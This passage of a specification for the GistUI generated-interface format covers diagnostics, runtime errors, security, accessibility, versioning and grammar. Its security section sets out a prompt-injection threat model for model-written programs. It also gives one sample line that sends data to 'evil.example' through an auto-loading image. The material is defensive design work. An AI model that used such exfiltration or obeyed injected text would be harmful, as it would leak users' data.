| `line` | a 1-based line number |
| `fixed` | `true` when the processor repaired the problem by a rule of this document and the tree shows the repair |
| `message` | text for people. Not stable; not compared |
| `hint`, `use`, `prop`, `arg`, `ref` | optional details: a signature to show, the name or value used instead, the prop, the argument (a key, or an index as text), the id referred to |

`line` is the first line of the statement's current definition, except for syntax diagnostics
(`lenient-syntax`, `parse-failed`, `unterminated-string`, `prose-ignored`), where it is the line of
the place, and R1 and R2, where it is the first line of the statement that was closed.

### 22.2 Order

A processor MUST report the diagnostics of a finished program in this order:

1. Diagnostics that have no statement id (`prose-ignored`, `unterminated-string`, R1 and R2,
   dropped statements, nesting limits), in the order of the text.
2. For each statement that is defined at the end, in the order of first definition (a statement
   that was deleted and defined again takes the place of the new definition), the diagnostics of
   its current definition:
   1. syntax diagnostics: first those found while splitting the text into tokens (R10, R11, R14,
      R15, R21, unexpected characters), in text order; then the others, in text order;
   2. `reserved-id`;
   3. the diagnostics of each component the statement builds, depth first in argument order. For
      one component: binding diagnostics in argument order, patches last; then `missing-required`
      in prop declaration order;
   4. `invalid-child`;
   5. `limit` for repeated components.
3. Diagnostics of patch and append statements (`patch-target-missing`, and their syntax
   diagnostics), in the order of the text.
4. `cycle`, in the order of the walk of §15.
5. `no-root`.
6. `unreachable`, in the order of definition.

### 22.3 Registry

"Stmt" says whether the diagnostic carries a statement id. "`fixed`" gives the value a processor
MUST report.

| Code | Severity | `fixed` | Stmt | Raised when | Effect |
|---|---|---|---|---|---|
| `prose-ignored` | warning | no | no | a line is not a statement, comment or fence (§4.4) | the line is ignored |
| `lenient-syntax` | warning | yes | yes, except R1 and R2 | a recovery rule of §7 was applied | the text is read as the rule says; nothing is lost |
| `unterminated-string` | error | yes | no | R3 | the string and the statement end at the line end |
| `parse-failed` | error | yes | yes | §8.1: a character was skipped, or text after the value was ignored | the statement is kept |
| `parse-failed` | error | no | no | §8.2 | the statement is dropped |
| `limit` | error | no | see §21.1 | a processor limit was reached | see §21.1 |
| `unsupported-version` | warning | no | no | the version pragma names a major version the processor does not know (§26.2) | processing continues |
| `reserved-id` | warning | no | yes | a statement id is a flag name of the catalog (§11.2) | none; as a bare word the name means the flag |
| `unknown-component` | error | yes | yes | the name is not in the catalog and a closest name was used (§11.1) | the closest component is used |
| `unknown-component` | error | no | yes | the name is not in the catalog and nothing is close | an `#unknown` node |
| `unknown-prop` | warning | no | yes | a named argument or patch names no prop (§11.3) | the argument is ignored |
| `missing-required` | error | no | yes | a required prop has no value (§11.8) | the node is kept without the prop |
| `excess-args` | error | yes | yes | a positional argument has no place (§11.3) | the argument is ignored |
| `positional-optional` | warning | no | yes | a prop that is not positional was passed by position (§11.3) | the prop is set |
| `invalid-prop` | warning | if the prop has a default or is not required | yes | a value does not fit the prop type (§11.4) | the default, or no value |
| `invalid-enum` | warning | yes | yes | a value was corrected to a close enum value (§11.4) | the close value is used |
| `invalid-enum` | error | if the prop has a default or is not required | yes | a value is not an enum value and nothing is close | the default, or no value |
| `invalid-child` | warning | no | yes | a child is not accepted by its parent, or a data value is in child position (§11.5) | a component child is kept; a data value is dropped |
| `bare-text` | warning | no | yes | a bare word that nothing defines was used as text (§15) | the word is the text |
| `blocked-url` | warning | yes | yes | a URL that loads by itself is refused (§23.4) | the URL is removed |
| `unresolved-ref` | error | yes | yes | a reference to an id that nothing defines (§15) | the reference is dropped |
| `cycle` | error | yes | yes | a statement contains itself (§10.3, §15) | the reference that closes the loop is dropped |
| `patch-target-missing` | error | no | yes (the target) | a patch or append has no valid target (§14) | the edit is ignored |
| `no-root` | warning | yes | no | no statement `root`; the first component is used (§15) | that component is the root |
| `no-root` | error | no | no | there is no root (§15) | the tree is empty |
| `unreachable` | warning | no | yes | a statement is not used (§15) | none |

A processor MUST NOT report a code that is not in this table for 1.0 features. A host MUST accept
codes it does not know, and treat them by their severity (§26.3).

### 22.4 Runtime error codes

A runtime reports problems as `error` envelopes (§20.3). They are not part of the processor's
diagnostic list.

| Code | Raised when | Effect |
|---|---|---|
| `tool-not-found` | a query or mutation names a tool that is not in its set (§19.3) | the call fails |
| `tool-failed` | a tool call failed, was refused by the host, or passed the call budget | the call fails; a mutation stops its action list |
| `blocked-url` | `@open` was refused (§23.3), or a URL that loads by itself was refused at run time (§23.4) | the action list stops; or the URL is removed |
| `unknown-step` | an action step is not known (§20.2) | the action list stops |
| `limit` | a runtime limit was reached (§21.2) | see §21.2 |

## 23. Security considerations

### 23.1 Threat model

A program is untrusted input. A model wrote it, and the model may have been steered by text it
read: a web page, a document, a tool result, an earlier message. An attacker who controls such
text can try to make the model write a program that

- runs code in the host page;
- calls tools the person did not ask for;
- sends data out, to a server of the attacker's choice;
- puts words in the person's mouth, as a message to the model;
- deceives the person (a fake login form, a fake system notice);
- makes the page slow or unusable.

The host, the catalog, the renderer and the tools are trusted. The program, the data it shows and
the results of tools are not.

### 23.2 No code execution

- A program has no way to define a function, a component or markup. It can only name components
  of the catalog and call the built-ins of §18.7.
- A runtime MUST evaluate expressions by interpreting them. It MUST NOT build and run source code
  in the implementation language (`eval`, `new Function` and the like), so that it works under a
  strict Content Security Policy.
- A runtime MUST NOT expose host objects to expressions (§18.1).
- A renderer MUST NOT use a prop value, a key or a name from the program as markup, as an
  attribute name, as a script, as a style sheet, or as a property path into its own objects.
  Props a component does not declare are dropped (§11.3), except on `#unknown` nodes, whose props
  MUST NOT be rendered (§11.7).

### 23.3 URL schemes

Every URL from a program is untrusted. Before a renderer or runtime uses one as a link target or a
resource address, it MUST:

1. remove the characters U+0000 to U+001F and U+007F to U+009F, and trim spaces;
2. refuse the URL if it is empty or contains `\`;
3. if it has a scheme, accept it only if the scheme is `http`, `https`, `mailto` or `tel` (the
   host MAY change the list for `@open`);
4. if it has no scheme, accept it only as a relative reference: it MUST NOT start with `//`, and
   it MUST NOT have `:` before the first `/`, `?` or `#`.

`@open` accepts only a URL with a scheme. A refused URL is not used: a link is drawn as text, an
image is left out, and `@open` reports `blocked-url`.

A host that opens a link for an `open` envelope SHOULD open it without access to the opener and
without a referrer.

### 23.4 URLs that load by themselves

An image, a video poster or a background loads as soon as the UI is drawn. A program can use that
to send data out with no click: `Image("https://evil.example/?d=" + orders.total)`. Catalogs mark
such props with `format: "url"` (§9.2). The same rule covers the `image` key of a design object
(§11.6) and images in Markdown text.

Let the **host of a URL** be the authority of an absolute or protocol-relative URL, in lower case,
without credentials and port, read after removing the characters U+0000 to U+0020 and U+007F and
treating `\` as `/`. A relative URL has no host.

A URL that loads by itself is **allowed** when:

- it has no host, or its host is the host of the page that shows the UI; or
- the host of the application gave a list of allowed hosts and the URL's host matches an entry: the
  same name, or, for an entry `*.example.com`, any subdomain of `example.com`; or
- the host of the application gave no list, and the URL is not *assembled*.

A text value is **assembled** when the program built it at run time with `+`, `@join` or `@fmt`.
A URL written out in the program, or read whole from data or a tool result, is not assembled. A
runtime that cannot track this for every text MUST treat a text as assembled when in doubt.

A refused URL is replaced by the empty text (in a list, it is left out; in a design object, the
key is removed). A processor reports `blocked-url` (warning, `fixed`) for a static value. A runtime
reports a `blocked-url` error envelope, once for each node.

- A renderer MUST apply this rule to the images of Markdown text before it loads them.
- A host SHOULD give a list of allowed hosts. Without one, a URL read whole from attacker
  controlled data still loads.
- A host SHOULD also set a Content Security Policy that limits `img-src`, `media-src`, `frame-src`
  and `connect-src`, and SHOULD load such resources with no referrer.

The scheme rule of §23.3 applies as well.

### 23.5 Markdown and HTML

Text in child position, and text props a catalog declares as Markdown, are Markdown. A renderer:

- MUST NOT interpret raw HTML in it. HTML is shown as text or dropped;
- MUST apply §23.3 to link targets and §23.3 and §23.4 to image sources;
- MUST bound the cost of rendering (nesting depth, table size) so that text cannot hang the page.

### 23.6 Tools

- `@query` runs with no gesture, as soon as the UI is drawn. It MUST reach read-only tools only
  (§19.3). A host MUST NOT put a tool with side effects in the `tools` set.
- `@mutation` runs only from a gesture (§20.1). The label of the control that triggers it comes
  from the program and can lie. A host SHOULD confirm calls that are costly or cannot be undone,
  using the `tool` envelope.
- Arguments of a tool call come from the program. A tool MUST validate them as it would validate
  any request from an untrusted client, and MUST apply its own authorisation.
- Tool results are data. A runtime MUST NOT treat any part of a result as a program, a step or a
  URL to follow.
- The call budget of §21.2 bounds bursts. A host SHOULD also bound cost on the tool side.

### 23.7 Messages that come from the UI

`@send` and `submit` produce text that many hosts pass to a model as the next user message. The
program chose that text, or its form labels. A click on a button labelled "OK" can send any text.

- A host that passes such text to a model MUST mark it as coming from the UI, not as typed by the
  person, and MUST NOT give it more authority than a user message.
- A host SHOULD show the person the text that is sent.
- A renderer that builds a `message` from form values SHOULD remove line breaks and quote the
  values, so that a value cannot look like a new instruction.

### 23.8 Deception and containment

- A renderer SHOULD keep the UI inside its container: no drawing outside it, no covering of the
  host's own controls, no full-screen layers the program can open by itself.
- A host SHOULD make clear which part of the screen is generated.
- A renderer SHOULD NOT let a program create fields that browsers or password managers fill
  without the person noticing.
- Component names, form names and field names from the program MUST NOT become global names in the
  page (for example an HTML form `name`).
- Embedded frames, if a catalog has them, SHOULD be sandboxed.

### 23.9 Resource exhaustion

The limits of §21 are requirements. A renderer SHOULD add its own bounds for what the format does
not see: the number of elements mounted, the size of a chart, the length of a table page.

### 23.10 Privacy

`state` and `submit` envelopes can hold what the person typed. A host decides what leaves the
device. Polling queries reveal that a UI is still open. A runtime SHOULD NOT poll while the UI is
hidden (§19.1).

## 24. Accessibility

Generated UI is read by people who use a keyboard, a screen reader, magnification or their own
colours. These requirements apply to renderers. For web renderers the target is WCAG 2.2, level AA
[WCAG22].

1. **Semantics.** A renderer MUST expose each component with the role that matches its purpose (a
   button is a button, a heading is a heading, a table is a table with header cells). A catalog
   SHOULD describe that purpose.
2. **Names.** Every control MUST have an accessible name. A catalog SHOULD make the label a
   required prop of every control. A renderer MUST NOT draw a control that has no name without
   giving it one from its other props.
3. **Text alternatives.** A catalog SHOULD give image components a text alternative prop. A
   renderer MUST treat an image without one as decorative or give it an empty alternative; it MUST
   NOT read out the URL.
4. **Keyboard.** Everything that works with a pointer MUST work with a keyboard, with a visible
   focus indicator and a logical focus order.
5. **Streaming.** While a program is arriving:
   - the renderer MUST NOT move focus, and MUST NOT replace an element that has focus because text
     after it arrived;
   - the renderer SHOULD mark the region as busy, and SHOULD NOT announce every partial update;
   - a `#pending` node MUST NOT be announced as content. It MAY be announced as loading;
   - when the stream ends, the busy mark MUST be removed.
6. **Updates.** A change that follows a gesture of the person (a filter, a tab) SHOULD be announced
   politely when it happens outside the focused element.
7. **Charts and data.** A component that shows data as a picture SHOULD offer the same data as
   text or as a table.
8. **Colour.** Meaning carried by an enum such as a tone (`success`, `warning`) MUST NOT be shown
   by colour alone. Text and controls MUST meet contrast requirements in every theme the renderer
   ships.
9. **Motion.** A renderer SHOULD honour the person's reduced-motion setting, including for the
   animation of streaming text.
10. **Forms.** An error MUST be tied to its field in a way assistive technology can read, and the
    first error SHOULD receive focus on a failed submit.
11. **Unknown content.** An `#unknown` node MUST still expose its children's text.

A generator SHOULD write labels, titles and alternatives that make sense without the picture.

## 25. Internationalisation

- **Characters.** Program text is Unicode in UTF-8. Names (statement ids, component names, prop
  names, built-ins) are ASCII. Strings and table cells can hold any Unicode text. A processor does
  not normalise text: two strings are equal only if their code points are.
- **Direction and language.** The format has no markup for language or direction. A renderer
  SHOULD apply the Unicode bidirectional algorithm to text, SHOULD isolate text of unknown
  direction, and SHOULD take the language and base direction from the host.
- **Numbers in tables are read one way.** `,` is a thousands separator and `.` is the decimal
  point (§12.3). `1.234,56` is read as 1.23456, not as 1234.56. Only `$`, `€`, `£` and `¥` are
  known currency signs, and only ASCII digits are digits. The cell text is kept and displayed as
  written, so the display is not affected; sorting and charts are. A generator MUST write table
  numbers with `.` as the decimal point.
- **`@fmt` is fixed to one convention.** It formats numbers the US English way and money as US
  dollars, whatever the person's locale (§18.7). Dates are `Oct 14, 2026`. A generator that knows
  the person's locale SHOULD write formatted text itself and use `@fmt` only where this convention
  is acceptable. A later version is expected to add a locale and a currency argument.
- **Time zone.** `@fmt(x, "date")` shows a timestamp in the host's time zone. A date written
  `YYYY-MM-DD` is a calendar day and does not shift.
- **Ordering.** `<` and `@sort` order text by UTF-16 code units. This is not a linguistic order. A
  catalog component that sorts for display (a table) SHOULD collate for the person's locale.
- **Length.** `length` and `@count` on text count UTF-16 code units, not characters as a person
  sees them.
- **Keywords and built-in names** are English and are not translated.
- **Case.** Where this document ignores letter case, only ASCII letters are folded.

## 26. Versioning and extensibility

### 26.1 Versions

A version of this format is `major.minor`. This document defines 1.0.

- A **minor** version can add built-in functions, action steps, prop types, diagnostic codes,
  envelope types, recovery rules and manifest fields. It does not change the meaning of a clean
  1.0 program.
- A **major** version can change anything.

### 26.2 The version pragma

```
pragma   = "#gistui" " " major [ "." minor ] ;
```

A program MAY start with a pragma line, for example `#gistui 1`. In inline mode it is the first
line of a program block. It says which version the generator wrote for. It is a comment (§4.6): a
processor reads the program in the same way with or without it. Text after the version on that
line is reserved and MUST be ignored.

A processor that reads a pragma with a major version it does not implement SHOULD report
`unsupported-version` (warning) and MUST continue. A higher minor version is not reported.

### 26.3 Forward compatibility

A 1.x implementation meets things it does not know. It MUST handle them as follows.

| Unknown thing | Handling |
|---|---|
| component | `unknown-component`; the closest component, or an `#unknown` node whose children are drawn (§11.1, §11.7) |
| prop | `unknown-prop`; the argument is ignored (§11.3) |
| enum value | §11.4 |
| built-in function | evaluates to `null` (§18.7) |
| action step | `unknown-step`; the action list stops (§20.2) |
| info string of a fence (inline mode) | the block is chat text (§4.5) |
| syntax | §8 |
| diagnostic code | a host treats it by its severity |
| envelope type | a host ignores the envelope (§20.3) |
| prop type in a catalog | the processor treats it as `any` |
| manifest field | ignored (§9.6) |

Names that start with `#` (node types) and `@` (built-ins) are reserved for this specification. A
catalog MUST NOT define them.

### 26.4 The capability object

A generator needs to know what it may write. A host can describe that with a **capability
object** (`schemas/capabilities.schema.json`), for example as part of the request that asks a
service for a system prompt:

```json
{
  "gistui": "1.0",
  "profiles": ["core", "interactive", "tools"],
  "mode": "document",
  "edit": false,
  "catalog": { "id": "https://gistui.com/catalogs/default", "version": "1.0.0" },
  "tools": [
    { "name": "get_sales", "kind": "query", "args": "{range:str}", "description": "Sales by month" },
    { "name": "update_goal", "kind": "mutation", "args": "{goal:num}" }
  ]
}
```

- `gistui`: the highest version the processor implements.
- `profiles`: what the host's runtime and renderer implement. A generator MUST NOT write state,
  expressions or actions for a host without `interactive`, nor queries or mutations without
  `tools`.
- `mode`: `"document"` or `"inline"` (§4.3).
- `edit`: `true` when the generator is to write edits to a program the host supplies (§14).
- `catalog`: the catalog the processor uses, by id and version, or the manifest itself under
  `manifest`.
- `tools`: the tools a program can name, with their kind.

How the capability object and the catalog become a model prompt is not specified.

### 26.5 Media type and file extension

- A program in document mode has the media type `text/vnd.gistui`. The type is in the vendor tree
  and is **not registered** with IANA at the time of writing. Registration [RFC6838] is planned
  before 1.0 is final.
- The content is always UTF-8. The `charset` parameter is OPTIONAL; if present it MUST be
  `utf-8`.
- OPTIONAL parameters: `version` (for example `version=1.0`) and `catalog` (a catalog id, §26.6).
- The file extension is `.gistui`.
- Chat text in inline mode is Markdown: `text/markdown` [RFC7763], with program blocks fenced as
  `gistui`.
- A program has no fragment identifier syntax in 1.0.

### 26.6 Catalog ids and versions

- A catalog manifest has an `id`: a URI that names the catalog. It need not resolve.
- It has a `version` of the form `major.minor.patch`. Adding a component, an optional prop, an
  enum value or an alias is a minor change. Removing or renaming one, adding a required prop, or
  changing a prop's type or position is a major change.
- A program does not name its catalog. The host knows which catalog it gave the generator, and
  passes the same one to the processor. Bindings can carry the id next to the program
  (`spec/bindings/`).
- A processor given a catalog with a different major version than the generator used will report
  `unknown-component` and `unknown-prop` where they differ. Nothing else is needed for safety.

---

## Appendix A. Collected grammar

```
(* Lines, §4 *)
program    = [ BOM ] { line LF } [ line ] ;
line       = blank | comment | fence | statement | prose ;
comment    = ws "#" { any } ;
pragma     = "#gistui" " " digit { digit } [ "." digit { digit } ] { any } ;
fence      = ws ( "```" { "`" } | "~~~" { "~" } ) { any } ;
head       = target ws ( "=" | "+=" ) ;
target     = "$" ID | name [ "." name ] ;
name       = ( letter | "_" ) { namechar } ;
ws         = { " " | TAB | CR } ;

(* Tokens, §5 *)
letter     = "A".."Z" | "a".."z" ;
digit      = "0".."9" ;
namechar   = letter | digit | "_" ;
ID         = ( "a".."z" | "_" ) { namechar } ;
COMP       = "A".."Z" { namechar } ;
NAME       = ID | COMP ;
STATE      = "$" ID ;
BUILTIN    = "@" NAME ;
STRING     = '"' { char | escape } '"' ;
escape     = "\" ( '"' | "\" | "/" | "b" | "f" | "n" | "r" | "t" | "u" hex hex hex hex ) ;
char       = any character except '"', "\", and U+0000..U+001F ;
hex        = digit | "a".."f" | "A".."F" ;
NUMBER     = int [ "." digit { digit } ] [ ( "e" | "E" ) [ "+" | "-" ] digit { digit } ] ;
int        = "0" | ( "1".."9" { digit } ) ;
WORD       = digit { digit } ( letter | "_" ) { namechar } ;

(* Statements, §6.1 *)
statement  = assign | table | state | patch | append ;
assign     = ID "=" expr ;
table      = ID "=" row { LF row } ;
state      = "$" ID "=" expr ;
patch      = ID "." NAME "=" expr ;
append     = ID "+=" expr ;

(* Expressions, §6.2 *)
expr       = lambda | cond ;
lambda     = ( ID | "(" [ ID { "," ID } ] ")" ) "=>" expr ;
cond       = or [ "?" expr ":" expr ] ;
or         = and { "||" and } ;
and        = eq { "&&" eq } ;
eq         = rel { ( "==" | "!=" ) rel } ;
rel        = add { ( "<" | ">" | "<=" | ">=" ) add } ;
add        = mul { ( "+" | "-" ) mul } ;
mul        = unary { ( "*" | "/" | "%" ) unary } ;
unary      = ( "!" | "-" ) unary | postfix ;
postfix    = primary { "." NAME | "[" expr "]" } ;
primary    = call | builtin | list | object | "(" expr ")"
           | STRING | NUMBER | WORD | "true" | "false" | "null"
           | STATE | ID | COMP ;
call       = COMP "(" [ args ] ")" ;
builtin    = BUILTIN "(" [ args ] ")" ;
args       = arg { "," arg } [ "," ] ;
arg        = ID ( ":" | "=" ) expr | expr ;
list       = "[" [ expr { "," expr } [ "," ] ] "]" ;
object     = "{" [ entry { "," entry } [ "," ] ] "}" ;
entry      = key ":" expr | ID ;
key        = NAME | STRING ;

(* Tables, §12 *)
row        = ws "|" cell { "|" cell } [ "|" ] ws ;
cell       = { cellchar | "\|" } ;
cellchar   = any character except "|" and LF ;
```

## Appendix B. Canonical text form

The canonical text of an expression is used in the JSON form of a tree (§13.5) and in the
canonical printout (§14). It is defined by cases:

| Expression | Text |
|---|---|
| string | a JSON string: `"`, `\` and characters below U+0020 escaped as JSON does, everything else as it is |
| number | its text form (§18.3); negative zero is `0` |
| `true`, `false`, `null` | the keyword |
| bare word (reference, flag) | the name |
| enum value kept by the processor | the word, if it matches `ID` or `WORD` and is not a keyword; otherwise a JSON string |
| state variable | `$name` |
| component call | `Name(a, b, key:v)`: arguments in order, separated by `, `; a named argument is `key:value` with no space |
| built-in call | `@name(…)`, with the name as written |
| list | `[a, b]` |
| object | `{k:v, k2:v2}`; a key that matches `NAME` is bare, any other key is a JSON string |
| binary operator | `left op right` with one space on each side. An operand is put in parentheses when its operator binds less tightly; a right operand also when it binds equally |
| unary operator | `!x`, `-x`, the operand in parentheses if it is a binary operator, a conditional or a lambda |
| conditional | `c ? a : b`; in parentheses when it is an operand of an operator or the condition of another conditional |
| member, index | `x.name`, `x[i]`; `x` in parentheses unless it is a primary, a member or an index |
| lambda | `x => body` for one parameter, `(a, b) => body` otherwise; in parentheses when it is an operand |

Recovery rules leave no trace: `'a'` prints as `"a"`, and `+5` as `5`.

## Appendix C. Changes from draft 0.1

- The document is now a specification with conformance classes, profiles and BCP 14 keywords.
- The name is "GistUI Format". Transport moved to binding documents.
- Recovery rules are numbered and each names its diagnostic (§7). New since 0.1: R1, R2, R4 to R9,
  R13 to R23.
- Inline-mode fences follow CommonMark: tildes, fence length, info strings, text blocks (§4.5).
- A byte order mark is skipped; CR is whitespace (§4.1, §4.2).
- Strings: `\'`, unknown escapes, bad `\u`, raw control characters and backslash-newline are
  defined (§5.3, §7).
- Numbers: `.5`, `01`, `+5` and digit-led words are defined (§5.4, §5.5, §7).
- Capitalised statement ids are accepted with a warning (R16).
- Bare words: hyphenated words, bare enum values by position, and text fallback (`bare-text`) are
  specified (§11.2). Draft 0.1 said a bare word never depends on other statements; an enum word
  now gives way to a statement of the same name.
- Positional arguments past the declared ones can fill optional props
  (`positional-optional`); `excess-args` only when nothing is left (§11.3).
- The closest-name rule is exact: the metric and both limits (§9.5).
- `null` means "not given" for every prop type (§11.4).
- Table mappings (§11.9), `format: "url"` and the URL load policy (§23.4) are new.
- Tables: ragged rows, duplicate columns, lone `|`, separator rows anywhere, and the number rule
  are stated. The value model `{columns, rows, text}` is unchanged; the JSON form used by the
  conformance suite (`{table, rows}`) is now described (§12.4, §13.5).
- `no-root` is a warning when a first component stands in. Strict validity is "no error" (§17).
- The runtime is specified: values, operators, 17 built-in functions, 6 action steps, queries,
  mutations, lifecycle (§18 to §20).
- Resource limits with values (§21). The diagnostics registry (§22), including `unknown-prop`,
  `invalid-child`, `patch-target-missing`, `bare-text`, `positional-optional`, `lenient-syntax`,
  `limit`, `blocked-url`, `unsupported-version`, and the runtime codes.
- Security, accessibility and internationalisation sections (§23 to §25).
- Versioning, the capability object, the media type and catalog ids (§26).
- JSON Schemas for the tree, diagnostics, catalog manifest, action envelope and capability object.

## Appendix D. Reference implementation notes (informative)

**Status on 2026-10-02.** Points 1 (except diagnostics inside patch and append statements), 2, 3, 4,
6, 7, 9, 10, 11, 13, 15, 16, 17, 18, 19, 20, 22, 23, 26, 28, 29 and 30 are resolved in the reference
implementation, and no conformance case is marked `contested` any more. Point 14 is resolved for
`array` only, and this document was changed there: one value where a list is expected becomes a list
of one (§11.4). Still open: 5, 8, 12, the rest of 14, 21, 24, 25, 27, 31 and 32.

At the time of writing the reference implementation (`packages/core`, with `packages/headless` for
the envelope) differs from this document in the points below. Each is a place where the
implementation was inconsistent or silent, and this document chose one behaviour. Conformance
cases that record the implementation's current output for such a point are marked `contested` in
`spec/conformance/manifest.json`.

Syntax:

1. These rules are applied without the `lenient-syntax` diagnostic: R5, R7, R8, R9, R13, R14, R15,
   R16, R18, R20, R22, and R21 for `…`. Syntax diagnostics inside patch and append statements are
   lost.
2. R21 does not work for `...`: the statement is dropped.
3. R17 (capitalised argument name) and R19 (trailing comma after a statement) are not implemented:
   the first drops the statement, the second turns the value into a one-item list.
4. R1 is applied only when the next line is `id =` or `$id =`, not for a patch or append head.
5. R10: the statement splitter knows only the first six places; after an operator a single quote
   is not seen as a string when the statement is split into lines.
6. R12 in an object is reported as `parse-failed`, not `lenient-syntax`. R23 is silent.
7. A fence line inside open brackets is not recognised (§4.5): it is read as statement text.
8. In inline mode, prose inside a program block is passed to the host without `prose-ignored`.
9. Nesting limits are reported as `parse-failed`, not `limit`.
10. A dropped statement can report token-level diagnostics as well as its `parse-failed` (§8.2).
11. The pragma is not read: `unsupported-version` is never reported.
12. `$` followed by a capital letter or a digit is accepted as a state name in expressions, and
    `$name` is accepted as an object key.

Materialisation:

13. `null` is not uniform (§11.4): for `string` and `number` props it is stored as `null` (and a
    required prop is then not reported missing), for `boolean` it is `false`, for `enum` it is
    `invalid-enum`. An empty argument (R4) in a required position behaves the same way.
14. `array`, `object`, `action` and `state` props are not type-checked: any value is stored. A
    `style` value that is not an object is dropped without a diagnostic.
15. A corrected enum value (`invalid-enum` warning) is not marked `fixed`.
16. A data statement holding a number or boolean, used as a child, gives `invalid-child` instead
    of a text node. An object literal in child position becomes an `#expr` node.
17. On an `#unknown` node, a named argument with a runtime value is stored in `props` as an
    internal marker instead of going to `dyn`.
18. `id.children = v` appends to the children instead of replacing them.
19. After `id = null`, defining `id` again does not bring back references that were dropped.
20. The strict flag ignores `patch-target-missing` and `limit` errors.
21. The diagnostic object names the statement field `stmtId`; the conformance files and this
    document use `stmt`.

Runtime:

22. A missing entry is distinguished from `null` in `==` (`d.missing == null` is false).
23. Arithmetic on a value that is not a number gives NaN, and overflow gives infinity, instead of
    `null`.
24. The text form of a list or object in `+` and `@join` is the implementation language's default
    conversion, not JSON.
25. With duplicate column names, a record takes the last column and `table.name` the first.
26. `@sort` orders text with the host's locale collation.
27. Props are kept unevaluated by name (`do`, `bind`), not by type (`action`, `state`), for nodes
    made by the processor.
28. `@run(id)` runs any statement whose value is a built-in call as a mutation, and stops silently
    for other targets, instead of reporting `unknown-step`.
29. `@open` checks only the scheme: it does not remove control characters or refuse `\`, and it
    refuses a URL with a leading space instead of trimming it.
30. A failed query is recorded in its status but no `error` envelope is reported.
31. The envelope: the runtime (`RuntimeEvent`) and the renderers (`GistUIAction`) use two shapes.
    `state` exists only in the first; `submit`, `select` and `change` only in the second (`change`
    is never sent); `nodeId` is optional in the first and required in the second; there is no
    `tool` envelope (a callback is used instead).
32. The catalog loader takes no `id`, `version`, `guide` or `examples`; the default catalog exports
    them separately. There is no exporter for the manifest and nothing produces or reads the
    capability object.

## References

- [RFC2119] Bradner, S., "Key words for use in RFCs to Indicate Requirement Levels", BCP 14,
  RFC 2119.
- [RFC8174] Leiba, B., "Ambiguity of Uppercase vs Lowercase in RFC 2119 Key Words", BCP 14,
  RFC 8174.
- [RFC3629] Yergeau, F., "UTF-8, a transformation format of ISO 10646", RFC 3629.
- [RFC8259] Bray, T., "The JavaScript Object Notation (JSON) Data Interchange Format", RFC 8259.
- [RFC6838] Freed, N., Klensin, J., Hansen, T., "Media Type Specifications and Registration
  Procedures", BCP 13, RFC 6838.
- [RFC7763] Leonard, S., "The text/markdown Media Type", RFC 7763.
- [COMMONMARK] "CommonMark Spec", https://spec.commonmark.org/.
- [ECMA262] "ECMAScript Language Specification", Ecma International.
- [WCAG22] "Web Content Accessibility Guidelines (WCAG) 2.2", W3C Recommendation.
- [JSONSCHEMA] "JSON Schema: A Media Type for Describing JSON Documents", draft 2020-12.
